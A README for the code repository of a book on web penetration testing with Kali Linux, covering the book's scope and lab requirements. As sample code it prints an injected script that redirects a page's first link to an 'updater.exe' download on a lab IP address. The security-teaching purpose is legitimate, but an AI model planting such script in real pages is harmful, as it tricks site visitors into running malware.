# Mastering Kali Linux for Web Penetration Testing
This is the code repository for [Mastering Kali Linux for Web Penetration Testing](https://www.packtpub.com/networking-and-servers/mastering-kali-linux-web-penetration-testing?utm_source=github&utm_medium=repository&utm_campaign=9781784395070), published by [Packt](https://www.packtpub.com/?utm_source=github). It contains all the supporting project files necessary to work through the book from start to finish.
## About the Book
You will start by delving into some common web application architectures in use, both in private and public cloud instances. You will also learn about the most common frameworks for testing, such as OWASP OGT version 4, and how to use them to guide your efforts. In the next section, you will be introduced to web pentesting with core tools and you will also see how to make web applications more secure through rigorous penetration tests using advanced features in open source tools. The book will then show you how to better hone your web pentesting skills in safe environments that can ensure low-risk experimentation with the powerful tools and features in Kali Linux that go beyond a typical script-kiddie approach. After establishing how to test these powerful tools safely, you will understand how to better identify vulnerabilities, position and deploy exploits, compromise authentication and authorization, and test the resilience and exposure applications possess.


## Instructions and Navigation
All of the code is organized into folders. Each folder starts with a number followed by the application name. For example, Chapter02.

Chapter 01, 02, 04, 05, 09, 11, and 12 doesn't contain code files.

The code will look like the following:
```

<script>window.onload = function() {var
AllLinks=document.getElementsByTagName("a"); AllLinks[0].href =
"http://172.16.30.128/updater.exe"; }</script>
```

Hardware list:
The exercises performed in this book and the tools used can be deployed on any modern
Windows, Linux, or Mac OS machine capable of running a suitable virtualization platform
and a more recent version of the OS. Suggested minimum requirements should allow for at
least the following resources to be available to your virtual platforms:
4 virtual CPUs
4-8 GB of RAM
802.3 Gigabit Ethernet, shared with host machine
802.11a/g/n/ac WiFi link, shared with host machine
Software list:
Desktop/Laptop Core OS and Hypervisor:
Virtualization should be provided by one of Kali Linux's supported hypervisors, namely
one of the following options. The operating system and hardware will need to support the
minimum requirements, with an eye toward dedicating the previous hardware
recommendations to the guest virtual machines.
